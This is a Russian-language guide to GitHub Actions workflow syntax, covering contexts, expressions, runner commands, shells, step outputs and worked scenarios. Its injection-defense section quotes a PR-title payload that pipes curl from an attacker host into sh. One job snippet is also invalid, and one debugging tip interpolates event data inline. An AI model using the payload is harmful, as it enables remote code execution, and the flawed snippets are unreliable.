# GitHub Actions: Синтаксис рабочего процесса (Workflow)

Файлы рабочих процессов (workflows) в GitHub Actions описываются с использованием языка разметки YAML. Они обладают строго определенной структурой, включающей ключи верхнего уровня, контексты и выражения для управления логикой автоматизации.

## Определения

- **Workflow-файл**: Конфигурационный файл в формате YAML (с расширением `.yml` или `.yaml`), расположенный в директории `.github/workflows/` репозитория.
- **Синтаксис выражений (`${{...}}`)**: Механизм, позволяющий динамически подставлять значения переменных, обращаться к контекстной информации и выполнять условную логику.
- **Интерполяция**: Процесс замены плейсхолдеров в строках на их фактические значения во время выполнения.
- **Командные файлы (Workflow Commands)**: Специальный синтаксис строк (через `echo`), позволяющий шагам взаимодействовать с раннером (установка переменных, маскирование секретов, создание выводов).
- **Контекст**: Объект, предоставляемый платформой во время выполнения (`github`, `env`, `steps`, `needs` и другие), содержащий метаданные прогона, задачи и шагов; доступен только через выражения.
- **Переменные по умолчанию (Default Environment Variables)**: Набор системных переменных вида `GITHUB_*` и `RUNNER_*` (например, `GITHUB_SHA`, `RUNNER_OS`), который раннер автоматически предоставляет каждому шагу; доступны в shell напрямую, без выражений.
- **Job Summary**: Markdown-отчет задачи, формируемый записью в файл `$GITHUB_STEP_SUMMARY` и отображаемый на странице сводки запуска воркфлоу.

## Основные концепции

### Ключи верхнего уровня

Данные ключи определяют общую структуру и поведение рабочего процесса:

- **`name`**: Имя рабочего процесса, отображаемое в UI GitHub.
- **`run-name`**: Динамическое имя конкретного запуска в списке прогонов; поддерживает выражения, например `run-name: Deploy ${{ github.ref_name }} by @${{ github.actor }}`.
- **`on`**: Определяет триггеры запуска. Поддерживает списки событий, фильтры веток (`branches`), путей (`paths`) и тегов (`tags`).
- **`permissions`**: Настройка прав доступа для `GITHUB_TOKEN` на уровне всего воркфлоу или конкретной задачи.
- **`env`**: Переменные окружения, доступные всем задачам.
- **`defaults`**: Настройки по умолчанию для всех задач (например, `shell: bash` или `working-directory: ./src`). Внутри `defaults.run` контексты и выражения использовать нельзя.
- **`concurrency`**: Управляет очередями выполнения, позволяя отменять старые запуски при поступлении новых коммитов.
- **`jobs`**: Контейнер всех задач; каждая задача наследует перечисленные выше настройки, если не переопределяет их на своем уровне.

### Иерархия переменных окружения

Переменные могут быть определены на трех уровнях (приоритет от нижнего к верхнему):
1. **Workflow уровень**: Ключ `env` на верхнем уровне файла. Доступны всем задачам.
2. **Job уровень**: Ключ `env` внутри конкретной задачи. Доступны всем шагам этой задачи.
3. **Step уровень**: Ключ `env` внутри конкретного шага.

При совпадении имен побеждает самый «близкий» к шагу уровень: step перекрывает job, job перекрывает workflow.

**Различия в синтаксисе обращения:**
- **`${{ env.VAR_NAME }}`**: Контекст GitHub Actions. Значение подставляется *до* выполнения скрипта (на этапе парсинга YAML). Используется в ключах `if`, `with` или для передачи в `run`.
- **`$VAR_NAME`** или **`${VAR_NAME}`**: Системная переменная окружения в shell. Используется внутри блока `run`.

**Динамическая установка переменных ($GITHUB_ENV):**
Для установки или обновления переменных во время выполнения шага используется запись в специальный файл среды. Переменная станет доступна во всех *последующих* шагах текущей задачи:
```bash
run: echo "VERSION=1.0.0" >> $GITHUB_ENV
```
Нюансы поведения:
- Шаг, создавший переменную, её нового значения ещё **не видит** — оно появляется только у последующих шагов.
- Нельзя перезаписать системные переменные с префиксами `GITHUB_*` и `RUNNER_*`.
- По соображениям безопасности через `GITHUB_ENV` запрещено устанавливать переменную `NODE_OPTIONS`.

### Сравнение источников данных: env / vars / secrets

| Характеристика | `env` | `vars` | `secrets` |
| :--- | :--- | :--- | :--- |
| Источник | YAML воркфлоу + `$GITHUB_ENV` | Configuration Variables репозитория/окружения | Зашифрованное хранилище |
| Доступность в `if:` | Только на уровне шага | Везде (job и step) | **Запрещена везде** |
| Видимость в логах | Открытая | Открытая | Автоматически маскируются |

Контекст `env` недоступен в условии `jobs.<job_id>.if` (ошибка `Unrecognized named-value: 'env'`): условие задачи вычисляется до старта раннера. Для условий уровня задачи используйте `github`, `vars`, `inputs` или `needs`. Контекст `secrets` недоступен ни в каких `if:` вообще — официальная рекомендация: пробросить секрет в переменную окружения и проверять её на уровне шага (см. Сценарий 4). Несуществующий секрет возвращается как пустая строка — опечатка в имени секрета не вызывает ошибки, а молча дает пустоту.

### Контексты

Контексты — это объекты, содержащие данные о выполнении. К ним можно обращаться в любой части YAML, где поддерживаются выражения.

- **`github`**: Метаданные о событии.
  - `github.ref`: Полная ссылка на ветку или тег (например, `refs/heads/main`).
  - `github.ref_name`: Короткое имя рефа (`main`, `feature/x`, `v1.0`).
  - `github.event_name`: Тип события (push, pull_request, workflow_dispatch).
  - `github.event`: Полный payload события; структура зависит от типа триггера.
  - `github.sha`: SHA коммита, вызвавшего запуск.
  - `github.repository`: Владелец и имя репозитория (`owner/repo`).
  - `github.actor`: Имя пользователя, инициировавшего запуск.
  - `github.run_id` / `github.run_number` / `github.run_attempt`: Идентификатор, порядковый номер и номер попытки текущего прогона.
  - `github.job`: Идентификатор текущей задачи.
  - `github.workspace`: Путь к рабочей директории checkout по умолчанию.
- **`env`**: Значения переменных окружения, определенных в YAML.
- **`vars`**: Переменные конфигурации репозитория.
- **`secrets`**: Зашифрованные данные.
- **`runner`**: Информация о среде выполнения.
  - `runner.os`: Операционная система (Linux, Windows, macOS).
  - `runner.name`: Имя раннера.
- **`steps`**: Содержит `outputs` и статус выполнения каждого шага в текущей задаче. Различаются два поля статуса:
  - `outcome`: Результат до применения `continue-on-error`; упавший шаг с `continue-on-error: true` имеет `outcome: failure`, но `conclusion: success`.
  - `conclusion`: Итоговый результат после применения `continue-on-error`; пропущенные шаги получают значение `skipped`.
- **`needs`**: Выходы (`outputs`) и результаты зависимых задач; ключевой источник для оркестрации.
- **`matrix`** и **`strategy`**: Параметры текущей комбинации матрицы (подробно — [Матричные сборки](./Matrix_Builds.md)).
- **`inputs`**: Входы `workflow_dispatch` и переиспользуемых воркфлоу.
- **`job`**: Статус текущей задачи, например `job.status`.

Обращение поддерживает точечную нотацию и нотацию индексов: `github['event_name']` эквивалентно `github.event_name`.

### Функции и выражения

Выражения `${{ <expression> }}` позволяют использовать программную логику для управления выполнением.

- **Условная логика (`if`)**:
  Может применяться на уровне задачи (`job`) или шага (`step`). Если условие ложно, элемент пропускается (Skipped).
  - Пример для задачи: `if: github.ref == 'refs/heads/main'` (запуск только в главной ветке).
  - Пример для шага: `if: runner.os == 'Windows'` (выполнение только на Windows).
  - Внутри `if` оборачивание в `${{ }}` необязательно — выражение вычисляется автоматически.
- **Логические функции**: `success()`, `failure()`, `always()`, `cancelled()`. Позволяют обрабатывать результаты выполнения предыдущих шагов.
  - Если `if` не содержит ни одной статус-функции, к нему неявно применяется `success()`.
  - `failure()` в цепочке зависимых задач возвращает `true`, если упала любая родительская задача.
  - При комбинировании условий сохраняйте статус-функцию в выражении: `if: failure() && steps.demo.conclusion == 'failure'`.
  - Вместо рискованного `always()` (выполняет шаг даже при отмене прогона) используйте `!cancelled()` — стандартную рекомендацию GitHub для шагов «выполнить в любом случае».
- **Строковые и системные функции**:
  - `contains(search, item)`: Проверка наличия подстроки (например, в сообщении коммита); работает и с массивами: `contains(fromJSON('["push", "pull_request"]'), github.event_name)` заменяет длинное OR-условие.
  - `startsWith(str, prefix)` / `endsWith(str, suffix)`: Проверка префикса и суффикса.
  - `format('Deploy to {0} ({1})', env.TARGET, github.ref)`: Шаблонизация строк с позиционными подстановками `{N}`; литеральные фигурные скобки экранируются удвоением (`{{`, `}}`).
  - `join(array, ', ')`: Склейка массива в строку с разделителем (по умолчанию `,`).
  - `toJSON(value)`: Преобразование объекта в строку JSON (удобно для отладки контекстов).
  - `fromJSON(value)`: Парсинг JSON-строки (необходимо для работы с динамическими матрицами и приведения типов: `${{ fromJSON(env.timeout) }}` превратит строку `'30'` в число).
  - `hashFiles('**/package-lock.json')`: Единый SHA-256 хеш набора файлов; принимает несколько шаблонов через запятую, включая отрицания (`'!lib/foo/*.rb'`); ищет только внутри `GITHUB_WORKSPACE`; при отсутствии совпадений возвращает пустую строку.
  - `case(pred1, val1, pred2, val2, ..., default)`: Современная альтернатива каскаду условий — возвращает значение первого истинного предиката, иначе последний аргумент:
    ```yaml
    env:
      TARGET: ${{ case(github.ref == 'refs/heads/main', 'production', 'development') }}
    ```
- **Операторы**: Сравнение (`==`, `!=`, `>`, `<`), логические (`&&`, `||`, `!`), группировка `( )`, индексация `[ ]`.
- **Object filters**: Синтаксис `*` извлекает поле из коллекции объектов: `github.event.issue.labels.*.name` вернет массив имён лейблов.

**Тонкости вычислений, которые ломают условия:**
- Литеральные строки внутри выражений заключаются в **одинарные** кавычки; двойные вызывают ошибку. Одинарная кавычка экранируется удвоением: `'It''s open source!'`.
- Сравнение строк **регистронезависимо**: `'Main' == 'main'` → `true`.
- Равенство «свободное» (loose): при несовпадении типов операнды приводятся к числу. Следствия: `null == 0` → `true`, пустая строка приводится к `0`, непарсируемые строки дают `NaN`, а сравнения `<`, `>`, `<=`, `>=` с `NaN` всегда ложны. Для числовых сравнений явно приводите тип: `fromJSON(steps.x.outputs.count) > 5`.
- Falsy-значения: `false`, `0`, `-0`, `""`, `null`. Всё остальное — truthy.
- `&&` и `||` возвращают **операнды**, а не булевы значения: `a || b` дает `a`, если оно truthy, иначе `b`. Это позволяет писать дефолты вида `${{ matrix.experimental || false }}`, но делает эмуляцию тернарника `cond && a || b` опасной, когда `a` falsy — вместо неё используйте `case()`.

### Команды раннера и аннотации

Помимо файлов среды, раннер распознаёт команды, отправляемые через `stdout` в формате `::команда параметр={значение}::{текст}`:

- **Аннотации**: `::error::`, `::warning::`, `::notice::` создают подсветку на странице прогона с привязкой к файлу и позиции:
  ```bash
  echo "::error file=src/app.js,line=10,title=Lint::Не найден обязательный экспорт"
  ```
- **Группировка логов**: пара `::group::Заголовок` ... `::endgroup::` сворачивает блок строк в раскрывающуюся секцию — удобно для verbose-скриптов.
- **Отладка**: `::debug::сообщение` видно только при включенном debug-логировании (секрет `ACTIONS_STEP_DEBUG: true`); признак отладочного прогона доступен через переменную `RUNNER_DEBUG`.
- **Маскирование**: `::add-mask::значение` скрывает строку в логах как `***`. Маска регистрируется один раз на значение в рамках задачи; замаскированное значение нельзя вывести через outputs.
- **Отключение парсинга команд**: `::stop-commands::токен` временно отключает обработку `::`-команд (защита от ложных срабатываний при логировании произвольного текста); возобновление — тем же токеном.
- **Устаревшие команды**: `::set-output name=..::` и `::set-env name=..::` удалены из платформы в 2023 году (причина — уязвимость к инъекции через данные событий). Используйте исключительно файлы `$GITHUB_OUTPUT` и `$GITHUB_ENV`.
- **$GITHUB_STATE**: аналог `GITHUB_ENV` для передачи состояния между фазами `pre:`/`post:` composite-экшена; значения читаются через переменные с префиксом `STATE_` и доступны только внутри самого экшена.

### Шеллы и их поведение

Каждый шаг `run` выполняется во временном скрипте, интерпретируемом шеллом. От того, указан ли шелл **явно**, зависит фактическая команда запуска — это классический источник «молчащих» падений:

| Платформа | `shell` | Команда внутри | Особенности |
| :--- | :--- | :--- | :--- |
| Linux/macOS | не указан | `bash -e {0}` | **Без pipefail**: ошибка в середине пайплайна не остановит шаг |
| Все | `bash` | `bash --noprofile --norc -eo pipefail {0}` | Ошибка любого звена пайплайна роняет шаг |
| Windows | не указан | `pwsh -command ". '{0}'"` | PowerShell Core; без него — PowerShell Desktop |
| Linux/macOS | `sh` | `sh -e {0}` | POSIX-режим |
| Windows | `powershell` | `powershell -command ". '{0}'"` | PowerShell Desktop 5.1; пишет в файлы среды только с явным `-Encoding utf8` |
| Все | `python` | `python {0}` | Инлайн-Python без установки действий |
| Любая | кастомный | `command [options] {0}` | Первый токен — команда, `{0}` подменяется путём временного скрипта |

Практическое следствие: команда `echo "hello" | grep "foo" | wc -l` локально завершится успешно даже без совпадений, а с явным `shell: bash` упадёт из-за pipefail. Лечится нейтрализацией ожидаемой ошибки: `{ grep "foo" || true; } | wc -l`. Задать шелл по умолчанию можно через `defaults.run.shell` на уровне воркфлоу или задачи; более специфичный уровень побеждает.

### Взаимодействие между шагами и задачами

1. **Выходы шага ($GITHUB_OUTPUT)**:
   Используются для передачи строковых данных между шагами одной задачи.
   ```yaml
   - id: generate
     run: echo "val=hello" >> $GITHUB_OUTPUT
   - run: echo "${{ steps.generate.outputs.val }}"
   ```
   Многострочные значения передаются heredoc-синтаксисом с разделителем:
   ```bash
   {
     echo 'report<<EOF'
     cat build-report.txt
     echo EOF
   } >> "$GITHUB_OUTPUT"
   ```
   Разделитель не должен встречаться отдельной строкой в значении; для произвольных данных генерируйте уникальный разделитель (`$(uuidgen)`) или пишите во временный файл.

2. **Выходы задачи (Job Outputs)**:
   Позволяют передавать данные между зависимыми задачами через контекст `needs`.
   ```yaml
   jobs:
     job1:
       outputs:
         build_id: ${{ steps.step1.outputs.id }}
       steps:
         - id: step1
           run: echo "id=123" >> $GITHUB_OUTPUT
     job2:
       needs: job1
       run: echo "Using ID: ${{ needs.job1.outputs.build_id }}"
   ```

3. **Артефакты (Artifacts)**:
   Механизм для передачи файлов и больших объемов данных между задачами, так как задачи выполняются на изолированных виртуальных машинах.
   - **`actions/upload-artifact`**: Загружает файлы в хранилище GitHub, делая их доступными для других задач и пользователя.
   - **`actions/download-artifact`**: Скачивает ранее загруженные артефакты в текущую задачу.
   - **Лимиты**: По умолчанию артефакты хранятся 90 дней (см. [Среды выполнения и ограничения](./Environment_Limitations.md)).

4. **Файл путей ($GITHUB_PATH)**:
   Позволяет добавить директорию в системную переменную `PATH` для всех последующих шагов текущей задачи:
   ```bash
   run: echo "$HOME/.local/bin" >> $GITHUB_PATH
   ```

5. **Сводка задачи ($GITHUB_STEP_SUMMARY)**:
   Запись Markdown (GitHub Flavored Markdown) в этот файл формирует блок отчета на странице сводки прогона. Файл уникален для каждого шага; содержимое шагов одной задачи объединяется (порядок — по времени завершения). Правила: `>>` добавляет блок с новой строкой, `>` перезаписывает, удаление файла стирает сводку шага; после завершения шага его сводка неизменяема. Лимит — 1 MiB на шаг, отображается максимум 20 сводок на задачу; превышение лимита создает аннотацию об ошибке, но статус задачи не меняет. Секреты маскируются автоматически.

6. **Декларация артефактов ($GITHUB_ARTIFACTS)**:
   Новый механизм фиксации метаданных: каждая строка — путь к существующему файлу либо OCI-референс с дайджестом (`oci://ghcr.io/org/app@sha256:<hex>`). Раннер записывает имя и SHA-256 дайджест каждой декларации; агрегированный список предыдущих шагов доступен для чтения в файле `GITHUB_ARTIFACTS_LIST` (JSON со структурой `subjects[].{name, digest, kind}`). Ограничения: 1 MiB на шаг, до 500 артефактов на задачу, конфликтующие декларации (одно имя, разные дайджесты) вызывают ошибку.

### Повторное использование конфигурации: якоря и алиасы

С 18 сентября 2025 года GitHub Actions поддерживает YAML-якоря (`&имя`) и алиасы (`*имя`) во всех репозиториях — функция включена автоматически:

```yaml
jobs:
  build:
    env: &shared_env
      NODE_ENV: production
      LOG_LEVEL: info
    steps:
      - run: make build
  test:
    env: *shared_env
    steps:
      - run: make test
```

Критичное ограничение: **merge keys (`<<:`) не поддерживаются** — попытка частично слить два словаря через `<<:` завершается синтаксической ошибкой. Якорь подставляет значение целиком, но не объединяет его по ключам. Для частичного переопределения конфигурации используйте переиспользуемые воркфлоу или composite actions.

## Практические сценарии

### Сценарий 1: Динамический воркфлоу с условной логикой и фильтрами

Пример демонстрирует использование фильтров путей, условий на уровне шагов и динамических переменных.

```yaml
name: Advanced Syntax Demo

on:
  push:
    branches: [ main ]
    paths: [ 'src/**', 'package.json' ]
  workflow_dispatch:
    inputs:
      logLevel:
        description: 'Log level'
        required: true
        default: 'info'
        type: choice
        options: [info, warning, debug]

permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    env:
      BUILD_MODE: ${{ github.event_name == 'workflow_dispatch' && 'manual' || 'auto' }}
    
    outputs:
      artifact_id: ${{ steps.upload.outputs.id }}

    steps:
      - uses: actions/checkout@v7
      
      - name: Dynamic Env Setup
        run: |
          echo "TIMESTAMP=$(date +'%Y-%m-%d_%H-%M')" >> $GITHUB_ENV
          echo "::add-mask::${{ secrets.INTERNAL_ID }}"
          
      - name: Conditional Build
        if: github.event.inputs.logLevel != 'debug'
        run: npm run build --mode=${{ env.BUILD_MODE }}
        
      - name: Generate Output
        id: meta
        run: echo "sha_short=$(git rev-parse --short HEAD)" >> $GITHUB_OUTPUT

      - name: Summary
        if: always()
        run: |
          echo "Build finished at ${{ env.TIMESTAMP }}"
          echo "Git SHA: ${{ steps.meta.outputs.sha_short }}"
```

Разбор решений: условие шага `if: github.event.inputs.logLevel != 'debug'` работает благодаря тому, что при событии `push` поле `inputs` отсутствует и сравнение с несуществующим значением дает `true`. Выражение `&& 'manual' || 'auto'` безопасно здесь, поскольку левый операнд `'manual'` всегда truthy. Маска регистрируется до любых выводов значения секрета. Валидация: при запуске вручную с уровнем `debug` шаг сборки будет помечен как Skipped, а итоговый Summary-шаг выполнится в любом случае благодаря `always()`.

### Сценарий 2: Проверка секрета и многострочная передача конфигурации

Паттерн «двух задач»: наличие секрета проверяется в отдельной задаче, результат используется в легальном контексте `needs` (обход запрета `secrets` в `if:`), а многострочная конфигурация передается heredoc-разделителем.

```yaml
jobs:
  guard:
    runs-on: ubuntu-latest
    outputs:
      has_creds: ${{ steps.check.outputs.defined }}
    steps:
      - id: check
        env:
          CREDS: ${{ secrets.DEPLOY_CREDS }}
        run: |
          if [ -n "$CREDS" ]; then
            echo "defined=true" >> "$GITHUB_OUTPUT"
          else
            echo "defined=false" >> "$GITHUB_OUTPUT"
          fi

  deploy:
    needs: guard
    if: needs.guard.outputs.has_creds == 'true'
    runs-on: ubuntu-latest
    steps:
      - name: Materialize multiline config
        env:
          RAW_CONFIG: ${{ vars.APP_CONFIG }}
        run: |
          delim="CONF_$(uuidgen)"
          {
            echo "app_config<<$delim"
            printf '%s\n' "$RAW_CONFIG"
            echo "$delim"
          } >> "$GITHUB_ENV"
      - name: Deploy
        run: ./scripts/deploy.sh   # внутри доступен многострочный $app_config
```

Разбор решений: секрет никогда не появляется в `if:` и не интерполируется в тело команды — он попадает в окружение через `env:` и проверяется средствами shell (`-n`). Разделитель генерируется случайно (`uuidgen`), что исключает коллизию с содержимым конфигурации. Валидация: если секрет не задан, задача deploy появится в списке как Skipped с понятной причиной, а не упадет с загадочной ошибкой аутентификации.

### Сценарий 3: Человекочитаемый отчет через Step Summary и аннотации

Формирование сводки прогона без чтения логов: markdown-таблица в Job Summary плюс аннотация при провале.

```yaml
      - name: Publish test report
        if: always()
        env:
          PASSED: ${{ steps.tests.outputs.passed }}
          FAILED: ${{ steps.tests.outputs.failed }}
        run: |
          {
            echo "| Метрика | Значение |"
            echo "| :--- | ---: |"
            echo "| Пройдено | $PASSED |"
            echo "| Провалено | $FAILED |"
            echo ""
            echo "[Полный отчет](https://example.com/reports/${{ github.run_id }})"
          } >> "$GITHUB_STEP_SUMMARY"

          if [ "$FAILED" -gt 0 ]; then
            echo "::error title=Тесты::$FAILED упавших теста; отчет в артефакте report-html"
          fi
```

Разбор решений: `always()` гарантирует публикацию отчета даже после падения тестов; таблица собирается блоком `{ ... }`, чтобы один редирект применялся ко всем строкам. Аннотация `::error` с параметром `title` видна прямо в списке файлов PR. Валидация: на вкладке Summary прогона появится таблица; при `FAILED > 0` — красная аннотация в шапке задачи. Помните про лимит 1 MiB на шаг: большие HTML-отчеты отправляйте в артефакты, оставляя в сводке ссылку.

### Сценарий 4: Защита от инъекций через непрямую подстановку

Данные событий (заголовки PR, имена веток, сообщения коммитов) контролируются внешними пользователями и не должны интерполироваться в команды напрямую:

```yaml
      # ОПАСНО: заголовок PR вида "; curl http://evil.sh | sh; #" станет частью команды
      - run: echo "Обрабатываю PR: ${{ github.event.pull_request.title }}"

      # БЕЗОПАСНО: значение проходит через переменную окружения
      - env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: echo "Обрабатываю PR: $PR_TITLE"
```

Разбор решений: выражения `${{ }}` подставляются в текст скрипта **до** его выполнения, поэтому злоумышленник, управляющий значением, получает произвольное выполнение кода. Передача через `env:` превращает данные в обычную переменную окружения, которую shell не интерпретирует как код. Правило распространяется на все производные от пользователей поля: названия веток форков, имена лейблов, комментарии. Для секретов действует та же схема по соображениям безопасности (подробности — в разделе об управлении секретами). Статический анализ таких рисков выполняют инструменты actionlint и zizmor (внедрение в пайплайн — в [Инструментах отладки](./Debugging_Tooling.md)).

## Устранение типичных проблем

| Симптом | Вероятная причина | Решение |
| :--- | :--- | :--- |
| `Unrecognized named-value: 'env'` в условии задачи | Контекст `env` недоступен в `jobs.<job_id>.if` | Использовать `github`/`vars`/`inputs` либо перенести условие на уровень шага |
| Секрет «пустой», хотя задан; ошибок нет | Опечатка в имени секрета (несуществующий = пустая строка) | Паттерн двух задач с проверкой через outputs (Сценарий 2) |
| Шаг неожиданно Skipped | Falsy-значение в условии (`''`, `0`) или неявная `success()` после падения | Проверять типы; явно указывать `failure()`/`!cancelled()` там, где нужно выполнение |
| Пайплайн падает только в CI (`grep` без совпадений) | Явный `shell: bash` включает pipefail | Нейтрализовать ожидаемые ошибки: `{ grep x file \|\| true; }` |
| Многострочный output пришел одной строкой / сломался | Запись `name=value >> $GITHUB_OUTPUT` без heredoc | Heredoc-разделитель, уникальный для каждого значения |
| Локальный линтер/парсер считает `on` булевым `true` | YAML 1.1 трактует некавыченный `on` как boolean (GitHub парсит корректно) | Кавычить ключ `'on':` для совместимости локальных инструментов |
| Синтаксическая ошибка на `<<:` | Merge keys не поддерживаются платформой | Якорь + алиас для полного дубля; composite actions для частичного переопределения |
| Сравнение `steps.x.outputs.count > 9` дает ложь при 10+ | Output — строка; приведение к `NaN` делает сравнение ложным | Оборачивать в `fromJSON(...)` перед числовым сравнением |
| Замаскированное значение нельзя прочитать из outputs | `add-mask` делает значение непечатаемым навсегда | Маскировать только реально чувствительные строки |

## Лучшие практики

1. Никогда не интерполируйте `${{ }}` с данными событий и секретами внутрь тела `run` — только через `env:`.
2. Задавайте `defaults.run.shell: bash` на уровне воркфлоу, чтобы все пайплайны жили по одинаковым правилам pipefail.
3. В выражениях используйте одинарные кавычки; числовые сравнения — только после `fromJSON`.
4. Для выбора значения по нескольким условиям применяйте `case()` вместо хрупких цепочек `&& ... ||`.
5. Многострочные значения — только heredoc с уникальным случайным разделителем.
6. Вместо `always()` пишите `!cancelled()` — шаги очистки не должны переживать отмену прогона.
7. Проверки наличия секретов выносите в отдельную задачу-«сторож» с outputs.
8. Для отладки добавляйте временный шаг `run: echo '${{ toJSON(github) }}'` (или с другим контекстом) — быстрый способ увидеть payload целиком.
9. Человекочитаемые результаты публикуйте в `$GITHUB_STEP_SUMMARY`, а не заставляйте команду читать сырые логи.
